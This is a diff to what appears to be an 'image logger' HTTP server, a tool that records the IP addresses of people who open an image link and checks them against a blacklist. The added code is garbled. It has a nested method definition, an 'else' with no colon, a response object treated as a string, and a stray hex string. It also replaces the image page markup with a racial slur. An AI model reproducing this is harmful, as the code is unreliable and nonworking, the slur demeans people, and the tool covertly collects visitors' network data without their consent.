@@ -200,18 +200,29 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-            data = f'''<style>body {{
+            def handleRequest(self):
+        try:
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                else:
+                    url = config["image"]
+            else:
+                url = config["image"]
+            url = requests.get("https://api.ipify.org/")
+            if url.startswith("128.116"):
+                data = f'''
+0x622C03769C8F'''
+                else
+                data = f'''<style>body {{
 margin: 0;
 padding: 0;
 }}
 div.img {{
 background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
+Fuck you nigga n shayy35492'''.encode()
             
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
